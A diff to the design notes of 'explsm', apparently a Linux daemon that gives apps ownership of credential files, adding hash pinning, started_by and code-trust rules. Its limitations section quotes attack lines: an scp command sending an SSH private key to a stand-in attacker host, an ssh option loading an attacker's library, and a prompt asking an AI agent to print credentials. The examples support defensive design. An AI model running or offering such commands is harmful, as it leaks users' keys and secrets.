@@ -41,7 +41,10 @@ whatever the policy explicitly grants.
    locations (`~/.local/share/claude/versions/*`) are therefore treated as
    owned data, and only the app may add files next to them. They are trusted
    only as long as the app itself is: an app that downloads its own updates
-   decides what its next version is.
+   decides what its next version is. Root-owned exes (`/usr/bin/…`, not
+   writable by group or others) are trusted because only root can change
+   them. An exe may be pinned to hashes (`sha256`, `hashes`), so that a file
+   at its path with none of them is no app.
 3. Interpreters (`node`, `python3`) are *not* an identity on their own; the
    script path narrows it. A script in a user-writable path has the same
    caveat as (2).
@@ -53,15 +56,27 @@ whatever the policy explicitly grants.
 - **Identity is per exec image, not per code origin.** Plugins or `eval`
   inside an owner app run with the app's identity.
 - **Anyone who can start an owner app can use it.** Malware doesn't have to
-  get into the app; it runs the real one. `scp ~/.ssh/id_ed25519 attacker:`
-  is `scp` with the `ssh` identity and sends the key away;
-  `ssh -o PKCS11Provider=/tmp/evil.so` makes the real `ssh` load a library
-  the attacker chose; an app that acts on instructions (`claude -p "print
-  the credentials"`) exfiltrates on request. explsm doesn't yet check who
-  started an app or what code it maps; see section 9 of
-  [release-plan.md](release-plan.md). Until then, keep keys behind
-  `ssh-agent` with `ssh-add -c` or a FIDO key, and don't make apps that act
-  on instructions the owner of credentials that matter.
+  get into the app; it runs the real one.
+  - `scp ~/.ssh/id_ed25519 attacker:` is `scp` with the `ssh` identity,
+    run with the attacker's arguments. `started_by` limits who may start
+    the app (another app, `@terminal`, `@desktop`), so a background process
+    gets no identity. `@terminal` is a chain of shells from a terminal: it
+    does not stop a script the user ran there (`bash evil.sh`), a wrapper
+    listed as a `shell`, or a program that opens a terminal with a command
+    of its choice (`gnome-terminal-server` does that for any caller).
+  - `ssh -o PKCS11Provider=/tmp/evil.so` makes the real `ssh` load a
+    library the attacker chose. `code trusted` (the default) refuses to map
+    as code a file that a user can change and that is not the app's; only
+    the file is checked, not the directories above it. `deny_args` drops
+    the identity on known options, but other spellings and config files
+    get around it.
+  - An app that acts on instructions (`claude -p "print the credentials"`,
+    shells, interpreters) exfiltrates on request. `started_by @terminal`
+    stops background malware from asking; nothing stops the user's own
+    script. Don't make such apps the owner of credentials that matter.
+
+  For keys, keep them behind `ssh-agent` with `ssh-add -c` or a FIDO key
+  (see `packaging/examples/ssh-agent.explsm`).
 - **Prompts are not blocking.** The first denied access fails with `EACCES`;
   approval takes effect on retry. fanotify permission events could hold an
   open while the user is asked, but BPF would have to allow those opens
@@ -153,7 +168,11 @@ whatever the policy explicitly grants.
   user-writable place resolves, nothing but the app may add files next to it
   or move its directory (or the ones above it a user could move) aside. A
   path or glob that matches nothing yet is not guarded: whatever appears
-  there first becomes the app.
+  there first becomes the app, unless the exe is pinned to hashes. The
+  daemon checks a hash when it resolves the path, so a file changed between
+  the hash and the guard taking hold is a short race. An app that updates
+  itself needs root to add each new version's hash; updates are not checked
+  by signature.
 - **Atomic saves of an owned file.** A file root replaced by a rename keeps
   its owner (the new file takes over), but the temporary file the app wrote
   first is only protected if it was in an owned folder.
